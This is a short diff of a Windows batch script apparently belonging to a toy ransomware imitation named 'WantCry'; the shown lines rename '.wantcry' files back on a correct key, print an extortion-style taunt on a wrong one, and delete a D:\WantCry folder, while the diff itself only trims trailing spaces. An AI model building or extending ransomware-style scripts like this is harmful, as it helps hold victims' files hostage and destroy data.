@@ -11,11 +11,11 @@ echo You have successfuly decrypt your files!
 ren *.wantcry *.* 
 pause 
 exit
-del D:\WantCry 
+del D:\WantCry
 if not %key% go to Crash
 :Crash 
 echo Wrong Key!
 echo Stay happily with your encrypted files...
 pause 
 exit 
-del D:\WantCry 
+del D:\WantCry
